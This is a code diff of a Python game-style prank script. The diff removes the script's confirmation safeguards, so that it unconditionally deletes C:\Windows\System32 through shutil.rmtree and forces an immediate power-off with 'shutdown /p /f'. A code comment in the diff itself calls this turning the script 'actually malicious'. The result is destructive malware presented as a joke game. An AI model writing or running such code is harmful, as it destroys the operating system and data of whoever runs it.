@@ -4,28 +4,10 @@ import shutil
 import ctypes
 import sys
 from time import sleep
+  
 
-#delete protection() and follow instructions on line 78-79 to turn safety off
-def protection():
-    confirms = 0
-    for i in range(4):
-      confirm = input("Are you want to actually get shot(delete 'C:\Windows\System32')? Input 1024 to agree, or anything else to only get a bruise.")
-      if confirm == "1024":
-          confirms += 1
-      elif confirm != "1024":
-          ctypes.windll.shell32.ShellExcecuteW(
-  None, "runas", "powershell", '-Command "wininit"', None, 1
-  )
-      break
-      exit()
-
-    if confirms == 6:
-        return True
-    
-
-def shot(confirmed):
-    if confirmed:
-        shutil.rmtree(r"C:\Windows\System32")
+def shot():
+    shutil.rmtree(r"C:\Windows\System32")
 
 def run(cmd):
     subprocess.run(cmd, shell=True, capture_output=False)
@@ -70,15 +52,11 @@ if __name__ == '__main__':
         sleep(0.4)
         print("Well better luck next time- ",end=" ")
         sleep(0.3)
-        print("Oh wait there won't be a next time-",end=" ")
-        sleep(0.2)
-        print("Say goodbye to system32!")
+        print("Oh wait there won't be a next time...",end=" ")
         sleep(1)
         #remove line below and the if statement below that, and replace shot(confirmed) with shot(False)
         #if you want to turn safety off (make it actually malicious)
-        confirmed = protection()
-        if confirmed:
-            shot(confirmed)
+        shot()
       else:
         sleep(0.4)
         print("As expected!\n")
@@ -90,7 +68,8 @@ if __name__ == '__main__':
       print("Well that's a shame...")
       sleep(0.3)
       print("I won't be seeing you off then...")
-      run("shutdown -s -t 3")
+      sleep(3)
+      run("shutdown /p /f")
     elif choice(choice) == "Punish":
       print("Had I known you'd be this rude, I would've kicked you out already.")
       sleep(0.07)
